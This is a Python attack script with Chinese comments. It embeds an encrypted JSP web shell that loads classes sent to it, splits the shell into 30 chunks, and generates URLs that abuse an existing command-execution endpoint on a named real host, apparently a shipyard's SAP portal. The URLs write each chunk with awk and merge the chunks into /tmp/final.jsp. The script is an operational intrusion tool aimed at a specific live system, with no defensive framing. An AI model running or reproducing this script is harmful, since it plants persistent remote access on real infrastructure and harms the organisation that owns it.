import urllib.parse

# JSP代码分成30份
jsp_code = '''<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''

# 计算每份的大致长度
chunk_size = len(jsp_code) // 30
chunks = []

# 分割代码
for i in range(30):
    start = i * chunk_size
    end = start + chunk_size if i < 29 else len(jsp_code)
    chunks.append(jsp_code[start:end])

def generate_request(payload, index):
    # 生成 ASCII 码列表
    codes = [ord(c) for c in payload]
    
    # 构造 awk 参数
    fmt = "%c" * len(codes)
    args = ",".join(str(c) for c in codes)
    awk_arg = f"BEGIN{{printf\"{fmt}\",{args}>\"/tmp/jsp_part{index}.txt\"}}"
    
    # URL-encode
    encoded = urllib.parse.quote(awk_arg, safe='')
    url = f"https://csl.cochinshipyard.in:8800/irj/helper.jsp?cmd=awk+{encoded}"
    return url

# 生成所有请求
for i, chunk in enumerate(chunks, 1):
    print(f"\n=== 第{i}部分 ===\n")
    print(generate_request(chunk, i))

# 生成合并文件的命令
print("\n=== 合并命令 ===\n")
cat_files = " ".join(f"/tmp/jsp_part{i}.txt" for i in range(1, 31))
cat_cmd = f"cat {cat_files} > /tmp/final.jsp"
print(f"https://csl.cochinshipyard.in:8800/irj/helper.jsp?cmd={urllib.parse.quote(cat_cmd)}")

# cat /tmp/jsp_part1.txt /tmp/jsp_part2.txt /tmp/jsp_part3.txt /tmp/jsp_part4.txt /tmp/jsp_part5.txt /tmp/jsp_part6.txt /tmp/jsp_part7.txt /tmp/jsp_part8.txt /tmp/jsp_part9.txt /tmp/jsp_part10.txt /tmp/jsp_part11.txt /tmp/jsp_part12.txt /tmp/jsp_part13.txt /tmp/jsp_part14.txt /tmp/jsp_part15.txt /tmp/jsp_part16.txt /tmp/jsp_part17.txt /tmp/jsp_part18.txt /tmp/jsp_part19.txt /tmp/jsp_part20.txt /tmp/jsp_part21.txt /tmp/jsp_part22.txt /tmp/jsp_part23.txt /tmp/jsp_part24.txt /tmp/jsp_part25.txt /tmp/jsp_part26.txt /tmp/jsp_part27.txt /tmp/jsp_part28.txt /tmp/jsp_part29.txt /tmp/jsp_part30.txt > /tmp/final.jsp
